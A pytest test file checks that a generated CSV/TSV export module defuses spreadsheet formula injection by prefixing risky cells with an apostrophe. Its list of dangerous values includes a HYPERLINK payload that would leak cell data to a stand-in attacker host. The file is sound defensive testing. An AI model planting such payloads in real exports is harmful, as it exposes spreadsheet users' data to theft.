"""CSV/TSV cells that a spreadsheet would run as formulas.

Exported values come from API responses.  Anyone who can set a display name or
a comment upstream can make a cell start with ``=``, ``+``, ``-`` or ``@``, and
a spreadsheet opening the file executes it (OWASP "CSV injection").  The
writers prefix such strings with an apostrophe unless told not to.
"""

from __future__ import annotations

import asyncio
import csv
import importlib.util
import sys
from pathlib import Path

import pytest
from pydantic import BaseModel

from otterapi.codegen.export import generate_export_module


class Row(BaseModel):
    id: int
    name: str
    note: str | None = None
    score: float | None = None
    tags: list[str] = []


@pytest.fixture(scope='module')
def export_runtime(tmp_path_factory):
    directory = tmp_path_factory.mktemp('formula_runtime')
    generate_export_module(directory)
    spec = importlib.util.spec_from_file_location(
        '_otterapi_formula_export', Path(directory) / '_export.py'
    )
    module = importlib.util.module_from_spec(spec)
    sys.modules['_otterapi_formula_export'] = module
    assert spec.loader is not None
    spec.loader.exec_module(module)
    yield module
    sys.modules.pop('_otterapi_formula_export', None)


def _read(path: Path, delimiter: str = ',') -> list[dict[str, str]]:
    with path.open(encoding='utf-8', newline='') as fh:
        return list(csv.DictReader(fh, delimiter=delimiter))


DANGEROUS = [
    '=SUM(1+1)',
    '=HYPERLINK("http://attacker.example/?"&A1,"click")',
    '+1+1',
    '-2+3',
    '@SUM(A1)',
    '\t=1+1',
    '\r=1+1',
    '-cmd',
    '--',
    '=',
]


class TestFormulaCellsAreDefused:
    @pytest.mark.parametrize('value', DANGEROUS)
    def test_dangerous_strings_get_a_leading_apostrophe(
        self, export_runtime, tmp_path, value
    ):
        path = tmp_path / 'out.csv'
        export_runtime.to_csv([Row(id=1, name=value)], path, model=Row)
        assert _read(path)[0]['name'] == "'" + value

    def test_every_text_column_is_covered(self, export_runtime, tmp_path):
        path = tmp_path / 'out.csv'
        export_runtime.to_csv([Row(id=1, name='ok', note='=1+1')], path, model=Row)
        assert _read(path)[0]['note'] == "'=1+1"

    def test_tsv_is_covered(self, export_runtime, tmp_path):
        path = tmp_path / 'out.tsv'
        export_runtime.to_tsv([Row(id=1, name='=1+1')], path, model=Row)
        assert _read(path, '\t')[0]['name'] == "'=1+1"

    def test_async_writers_are_covered(self, export_runtime, tmp_path):
        async def rows():
            yield Row(id=1, name='@SUM(A1)')

        csv_path = tmp_path / 'a.csv'
        tsv_path = tmp_path / 'a.tsv'

        async def run():
            await export_runtime.to_csv_async(rows(), csv_path, model=Row)
            await export_runtime.to_tsv_async(rows(), tsv_path, model=Row)

        asyncio.run(run())
        assert _read(csv_path)[0]['name'] == "'@SUM(A1)"
        assert _read(tsv_path, '\t')[0]['name'] == "'@SUM(A1)"

    def test_the_unified_entry_point_applies_it(self, export_runtime, tmp_path):
        path = tmp_path / 'out.csv'
        export_runtime.export([Row(id=1, name='=1+1')], path, model=Row, format='csv')
        assert _read(path)[0]['name'] == "'=1+1"


class TestOrdinaryDataIsUntouched:
    @pytest.mark.parametrize(
        'value',
        [
            'plain',
            'a=b',
            'name@example.com',
            'x-y',
            'user+tag@example.com',
            ' =leading space',
            '',
            '-5',
            '+1.5',
            '-.5',
            '1e-3',
            '-1E+10',
            '+42',
        ],
    )
    def test_value_round_trips(self, export_runtime, tmp_path, value):
        path = tmp_path / 'out.csv'
        export_runtime.to_csv([Row(id=1, name=value)], path, model=Row)
        assert _read(path)[0]['name'] == value

    def test_numeric_columns_are_not_quoted(self, export_runtime, tmp_path):
        path = tmp_path / 'out.csv'
        export_runtime.to_csv([Row(id=-7, name='x', score=-1.5)], path, model=Row)
        record = _read(path)[0]
        assert record['id'] == '-7'
        assert record['score'] == '-1.5'

    def test_json_encoded_containers_are_untouched(self, export_runtime, tmp_path):
        path = tmp_path / 'out.csv'
        export_runtime.to_csv([Row(id=1, name='x', tags=['=a', '-b'])], path, model=Row)
        assert _read(path)[0]['tags'] == '["=a","-b"]'


class TestOptOut:
    @pytest.mark.parametrize('value', ['=1+1', '@user', '-abc'])
    def test_escape_formulas_false_keeps_values_exact(
        self, export_runtime, tmp_path, value
    ):
        path = tmp_path / 'out.csv'
        export_runtime.to_csv(
            [Row(id=1, name=value)], path, model=Row, escape_formulas=False
        )
        assert _read(path)[0]['name'] == value

    def test_opt_out_reaches_the_other_writers(self, export_runtime, tmp_path):
        tsv = tmp_path / 'out.tsv'
        export_runtime.to_tsv(
            [Row(id=1, name='=1+1')], tsv, model=Row, escape_formulas=False
        )
        assert _read(tsv, '\t')[0]['name'] == '=1+1'

        dispatched = tmp_path / 'd.csv'
        export_runtime.export(
            [Row(id=1, name='@handle')],
            dispatched,
            model=Row,
            format='csv',
            escape_formulas=False,
        )
        assert _read(dispatched)[0]['name'] == '@handle'

    def test_jsonl_is_never_altered(self, export_runtime, tmp_path):
        path = tmp_path / 'out.jsonl'
        export_runtime.to_jsonl([Row(id=1, name='=1+1')], path, model=Row)
        assert '"=1+1"' in path.read_text(encoding='utf-8')
